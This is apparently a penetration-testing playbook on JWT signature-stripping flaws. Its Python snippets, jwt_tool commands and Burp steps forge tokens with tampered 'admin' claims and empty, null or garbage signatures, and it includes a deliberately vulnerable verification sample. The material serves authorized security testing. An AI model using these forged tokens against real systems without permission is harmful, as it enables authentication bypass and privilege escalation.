# JWT — Signature Stripping / No-Verification

## When this applies

- Verifier decodes the JWT without checking the signature (e.g. `jwt.decode(token, options={"verify_signature": False})`).
- Verifier accepts an empty signature segment.
- Verifier returns the decoded claims regardless of signature validity.

## Technique

Modify the payload claims to taste, then either keep the original signature (which won't validate but won't be checked) or strip the signature entirely. The verifier returns the modified claims because verification is disabled or bypassed.

## Steps

### 1. Detect: modify a claim, keep original signature

Decode the original token, change a claim, re-encode WITHOUT signing:

```python
import jwt, base64, json

token = "eyJ..."
parts = token.split('.')
modified_payload = jwt.decode(token, options={"verify_signature": False})
modified_payload['sub'] = 'admin'

new_payload_enc = base64.urlsafe_b64encode(
    json.dumps(modified_payload).encode()
).decode().rstrip('=')

# Keep original header and signature
modified_token = f"{parts[0]}.{new_payload_enc}.{parts[2]}"
```

If `modified_token` is accepted (200 response), signature verification is disabled.

### 2. Strip signature entirely

```python
parts = original_token.split('.')
stripped = f"{parts[0]}.{parts[1]}."
```

The trailing dot remains; signature segment is empty.

### 3. Empty / null signature variations

```python
import base64

# Empty
token = f"{header}.{payload}."

# Null byte signature
null_sig = base64.urlsafe_b64encode(b'\x00').decode().rstrip('=')
token = f"{header}.{payload}.{null_sig}"

# Garbage signature (when verifier accepts any non-empty value)
token = f"{header}.{payload}.invalid"
```

### 4. Detect "verify=False" in code

When you have source access, look for:

```python
# Python
jwt.decode(token, verify=False)
jwt.decode(token, options={"verify_signature": False})
jwt.get_unverified_claims(token)

# Node
jwt.decode(token)               # vs jwt.verify(token, key)

# Java
JwtParserBuilder.unsigned()      # JJWT 0.10+
new DefaultJwtParser().setSigningKey(null)
```

### 5. Conditional verification (optional flag)

Some apps verify only when a flag is set:

```javascript
function verify(token, checkSignature = false) {
    if (checkSignature) {
        return jwt.verify(token, secret);
    }
    return jwt.decode(token);  // bypassed!
}
```

Test by triggering the code path with the flag absent.

### 6. Empty / null secret

When the verifier IS called but the secret is empty:

```python
token = jwt.encode({"sub":"admin"}, "", algorithm="HS256")
# OR
token = jwt.encode({"sub":"admin"}, None, algorithm="HS256")
# OR
token = jwt.encode({"sub":"admin"}, b'\x00', algorithm="HS256")
```

If accepted, the verifier was checking the signature with an empty key.

### 7. jwt_tool

```bash
# Tamper without signing
python3 jwt_tool.py JWT -T -pc sub -pv admin

# Force verify
python3 jwt_tool.py JWT -V
```

### 8. Burp JWT Editor workflow

1. Repeater → JWT tab.
2. Modify payload claim (e.g. `sub: admin`).
3. Don't re-sign. Send.
4. If 200, signature verification is disabled.

## Verifying success

- Modified token (with original signature, modified claim) returns 200.
- Stripped token (empty signature) returns 200.
- Different claim values produce different server behavior — confirms claims are honored.

## Common pitfalls

- Many libraries default to verify=true; this is rare on modern code. Most often found in:
  - Custom hand-rolled JWT verification.
  - Microservice internal trust ("we trust our own tokens").
  - Test/staging code accidentally promoted to production.
- The trailing dot is mandatory; without it, parsers may reject the token format.
- Some libraries validate `exp` even with `verify_signature: False`. Use a far-future `exp`.
- Don't confuse "decoded successfully" with "accepted by the API" — always test the actual endpoint.

## Tools

- jwt_tool (`-T` tamper without signing).
- Burp Suite JWT Editor.
- Custom Python (manual `parts.split('.')` + base64).
